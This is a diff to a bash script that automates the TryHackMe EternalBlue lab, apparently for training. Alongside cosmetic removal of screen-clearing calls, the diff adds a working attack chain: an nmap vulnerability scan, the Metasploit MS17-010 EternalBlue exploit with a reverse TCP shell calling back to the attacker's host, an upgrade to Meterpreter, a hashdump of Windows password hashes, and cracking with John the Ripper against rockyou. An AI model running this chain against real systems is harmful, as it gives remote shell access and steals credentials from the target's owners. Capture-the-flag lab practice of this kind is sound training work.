@@ -21,31 +21,26 @@ show_banner() {
 
 # 🧠 Description Banner
 banner_description() {
-    clear
     echo -e "\n\033[1;36m==[ LAB DESCRIPTION ]==\033[0m"
 }
 
 # 📋 Tasks Banner
 banner_tasks() {
-    clear
     echo -e "\n\033[1;35m==[ TASK CHECKLIST ]==\033[0m"
 }
 
 # 🔌 VPN Banner
 banner_vpn() {
-    clear
     echo -e "\n\033[1;32m==[ VPN CONNECTION ]==\033[0m"
 }
 
 # ⚔️ Exploit Banner
 banner_exploit() {
-    clear
     echo -e "\n\033[1;31m==[ EXPLOITATION LAB ]==\033[0m"
 }
 
 # 📖 Answer Banner
 banner_answers() {
-    clear
     echo -e "\n\033[1;33m==[ QUESTIONS & ANSWERS ]==\033[0m"
 }
 
@@ -54,7 +49,6 @@ banner_answers() {
 # 🧠 Lab description
 show_description() {
     banner_description
-clear
 echo "========================================="
 echo "     💣 TRYHACKME: ETERNALBLUE LAB       "
 echo "========================================="
@@ -146,7 +140,6 @@ read -p "\n[*] Press Enter to return to the menu..."
 # 📋 Lab task checklist
 show_tasks() {
     banner_tasks
-   clear
    sleep 1
     echo "1. Connect to TryHackMe VPN"
     sleep 1
@@ -207,18 +200,43 @@ exploit_lab() {
     nmap -sV --script vuln "$rhost" -oN vuln_scan.txt
 
     echo "[i] Scan complete. Saved to initial_scan.txt and vuln_scan.txt"
-    read -p "[*] Press Enter to launch EternalBlue exploit..."
+    echo "[*] Launching EternalBlue exploit in Metasploit..."
 
     msfconsole -q -x "
 use exploit/windows/smb/ms17_010_eternalblue;
 set RHOSTS $rhost;
 set LHOST $lhost;
 set LPORT $lport;
-set PAYLOAD windows/x64/meterpreter/reverse_tcp;
+set PAYLOAD windows/x64/shell/reverse_tcp;
 exploit -j;
-exit;"
-}
+"
 
+    echo -e "\n[*] Waiting for session... Use 'sessions' in a new terminal to verify."
+
+    read -p "[?] Enter active session ID to upgrade to Meterpreter: " session
+    msfconsole -q -x "
+use post/multi/manage/shell_to_meterpreter;
+set SESSION $session;
+run;
+"
+
+    echo -e "\n[*] Meterpreter session should now be live."
+    echo -e "[*] Switching to Meterpreter to run post-exploitation..."
+
+    msfconsole -q -x "
+sessions -i $session;
+sysinfo;
+hashdump;
+"
+
+    read -p "[?] Paste any cracked hash to crack (only the hash portion): " hash
+    echo "$hash" > hash1.txt
+
+    echo "[*] Cracking with rockyou.txt..."
+    john hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+    echo -e "\n[✓] Done. Use 'sessions -i <ID>' to reattach anytime."
+}
 # 📖 Lab Q&A section
 show_answers() {
     banner_answers
